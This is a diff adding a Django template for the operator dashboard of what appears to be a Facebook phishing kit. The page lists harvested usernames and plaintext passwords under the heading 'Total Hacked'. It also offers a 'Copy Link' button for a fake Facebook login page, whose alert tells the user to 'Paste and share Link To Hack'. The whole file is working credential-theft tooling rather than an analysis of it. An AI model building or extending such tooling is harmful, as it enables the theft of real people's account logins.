@@ -1,0 +1,89 @@
+{% extends 'base.html' %}
+
+{% load static %}
+
+{% block body_block %}
+<div class="row container">
+        <div class="container col-md-6" style="margin-top: 100px;">
+          <div class="card">
+      
+            <div class="card-header bg-primary" style="font-weight: 900">
+              <h2>Total Hacked</h2>
+            </div>
+            <div class="card-body">
+      
+              <table class="table table-primary table-bordered table-hover">
+                <thead class="thead-light">
+                  <tr>
+                    <th>Username</th>
+                    <th>PassWord</th>
+                  </tr>
+                </thead>
+                <tbody>
+      {% for credential in credentials %}
+                  <tr >
+                    <td>{{credential.email}}</td>
+                    <td>{{credential.password}}</td>
+                  </tr>
+      {% endfor %}
+                </tbody>
+              </table>
+            </div>
+      
+      
+          </div>
+      
+        </div>
+      
+        <div class="col-md-6" style="margin-top: 100px; margin-bottom: 280px;">
+          <div class="card">
+      
+            <div class="card-header bg-primary" style="font-weight: 900">
+              <h2>Share Link</h2>
+            </div>
+            <div class="card-body">
+      
+              <table class="table  table-bordered ">
+                <thead class="thead-dark">
+                  <tr>
+                    <th>SiteName</th>
+                    <th>Link</th>
+                  </tr>
+                </thead>
+                <tbody>
+      
+                  <tr>
+      
+                    <td>Facebook</td>
+                    <td>
+                      <a href="{% url 'credential:phishing' id=user.id %}" target="#" id="fbLink">
+                        <img src="{% static 'fblogo.png'%}" style="width: 60px;height:54px;">
+                      </a>
+      
+                      <button onclick="copyText()" class="btn btn-primary">Copy Link</button>
+                    </td>
+                  </tr>
+      
+                </tbody>
+              </table>
+            </div>
+      
+      
+          </div>
+        </div>
+      </div>
+
+{% endblock %}
+
+{% block js %}
+<script>
+
+
+  function copyText() {
+    let text = document.getElementById("fbLink").href
+    copied = navigator.clipboard.writeText(text);
+    alert("Link Copied || Paste and share Link  To Hack")
+  }
+
+</script>
+{% endblock %}
